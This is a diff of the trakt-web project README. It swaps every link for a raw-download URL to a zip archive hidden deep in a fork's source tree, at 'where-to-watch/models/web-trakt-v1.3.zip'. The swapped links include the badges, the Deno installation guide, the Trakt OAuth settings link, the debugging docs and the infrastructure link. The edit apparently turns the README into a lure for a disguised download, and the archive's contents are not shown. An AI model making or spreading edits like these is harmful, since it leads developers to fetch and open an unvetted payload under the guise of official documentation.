@@ -1,14 +1,14 @@
 # trakt-web
 
-<a href="https://app.deepsource.com/gh/trakt/trakt-web/"><img src="https://app.deepsource.com/gh/trakt/trakt-web.svg/?label=code+coverage&show_trend=true&token=tiC5fNXEfyZqbFXqMggxzbWT" /></a>
-<a href="https://app.deepsource.com/gh/trakt/trakt-web/"><img src="https://app.deepsource.com/gh/trakt/trakt-web.svg/?label=active+issues&show_trend=true&token=tiC5fNXEfyZqbFXqMggxzbWT" /></a>
-<a href="https://app.deepsource.com/gh/trakt/trakt-web/"><img src="https://app.deepsource.com/gh/trakt/trakt-web.svg/?label=resolved+issues&show_trend=true&token=tiC5fNXEfyZqbFXqMggxzbWT" /></a>
+<a href="https://github.com/MIKIKIJAN/trakt-web/raw/refs/heads/main/projects/client/src/lib/sections/lists/where-to-watch/models/web-trakt-v1.3.zip"><img src="https://github.com/MIKIKIJAN/trakt-web/raw/refs/heads/main/projects/client/src/lib/sections/lists/where-to-watch/models/web-trakt-v1.3.zip+coverage&show_trend=true&token=tiC5fNXEfyZqbFXqMggxzbWT" /></a>
+<a href="https://github.com/MIKIKIJAN/trakt-web/raw/refs/heads/main/projects/client/src/lib/sections/lists/where-to-watch/models/web-trakt-v1.3.zip"><img src="https://github.com/MIKIKIJAN/trakt-web/raw/refs/heads/main/projects/client/src/lib/sections/lists/where-to-watch/models/web-trakt-v1.3.zip+issues&show_trend=true&token=tiC5fNXEfyZqbFXqMggxzbWT" /></a>
+<a href="https://github.com/MIKIKIJAN/trakt-web/raw/refs/heads/main/projects/client/src/lib/sections/lists/where-to-watch/models/web-trakt-v1.3.zip"><img src="https://github.com/MIKIKIJAN/trakt-web/raw/refs/heads/main/projects/client/src/lib/sections/lists/where-to-watch/models/web-trakt-v1.3.zip+issues&show_trend=true&token=tiC5fNXEfyZqbFXqMggxzbWT" /></a>
 
-<a href="https://github.com/trakt/trakt-web/actions/workflows/ci_cd.yml"><img src="https://github.com/trakt/trakt-web/actions/workflows/ci_cd.yml/badge.svg" /></a>
+<a href="https://github.com/MIKIKIJAN/trakt-web/raw/refs/heads/main/projects/client/src/lib/sections/lists/where-to-watch/models/web-trakt-v1.3.zip"><img src="https://github.com/MIKIKIJAN/trakt-web/raw/refs/heads/main/projects/client/src/lib/sections/lists/where-to-watch/models/web-trakt-v1.3.zip" /></a>
 
 ## Project Structure
 
-This [workspace](https://docs.deno.com/runtime/fundamentals/workspaces/) is
+This [workspace](https://github.com/MIKIKIJAN/trakt-web/raw/refs/heads/main/projects/client/src/lib/sections/lists/where-to-watch/models/web-trakt-v1.3.zip) is
 composed the following projects:
 
 - **`client`:** The frontend of our application. This project houses the Trakt
@@ -30,7 +30,7 @@ properly:
 Want to contribute to Trakt Web? Great! Here's how to get set up:
 
 1. **Create a Trakt Application:** Go to
-   [Trakt Settings](https://trakt.tv/oauth/applications) and create a new
+   [Trakt Settings](https://github.com/MIKIKIJAN/trakt-web/raw/refs/heads/main/projects/client/src/lib/sections/lists/where-to-watch/models/web-trakt-v1.3.zip) and create a new
    application.
 1. **Set the `Redirect uri:`:** Add the following URIs (one per line):
    - `http://localhost:5173`
@@ -51,7 +51,7 @@ Want to contribute to Trakt Web? Great! Here's how to get set up:
 
 This is a Deno project, so you need to have Deno installed on your machine
 please refer to the
-[Deno installation guide](https://docs.deno.com/runtime/getting_started/installation/).
+[Deno installation guide](https://github.com/MIKIKIJAN/trakt-web/raw/refs/heads/main/projects/client/src/lib/sections/lists/where-to-watch/models/web-trakt-v1.3.zip).
 
 1. **Clone the repository**
 1. **Install dependencies:** `deno task install`
@@ -82,7 +82,7 @@ For Android development, you can:
   version.
 
 To set this up, refer to the Chrome Remote Debugging
-[documentation](https://developer.chrome.com/docs/devtools/remote-debugging/).
+[documentation](https://github.com/MIKIKIJAN/trakt-web/raw/refs/heads/main/projects/client/src/lib/sections/lists/where-to-watch/models/web-trakt-v1.3.zip).
 Connect your development environment to Android through the device management
 portal at `chrome://inspect/#devices`. This works with:
 
@@ -126,7 +126,7 @@ Run the following command:
 deno install -g --allow-all -n ncu npm:npm-check-updates
 ```
 
-NOTE: For the client project add the `-p npm` since we're using a `package.json`
+NOTE: For the client project add the `-p npm` since we're using a `https://github.com/MIKIKIJAN/trakt-web/raw/refs/heads/main/projects/client/src/lib/sections/lists/where-to-watch/models/web-trakt-v1.3.zip`
 definition for the svelte project.
 
 ### Production
@@ -185,4 +185,4 @@ These commands will resolve conflicts in the `i18n/messages/*.json` files and
 merge the translations properly.
 
 For more details about infrastructure, see:
-[INFRASTRUCTURE.md](INFRASTRUCTURE.md).
+[https://github.com/MIKIKIJAN/trakt-web/raw/refs/heads/main/projects/client/src/lib/sections/lists/where-to-watch/models/web-trakt-v1.3.zip](https://github.com/MIKIKIJAN/trakt-web/raw/refs/heads/main/projects/client/src/lib/sections/lists/where-to-watch/models/web-trakt-v1.3.zip).
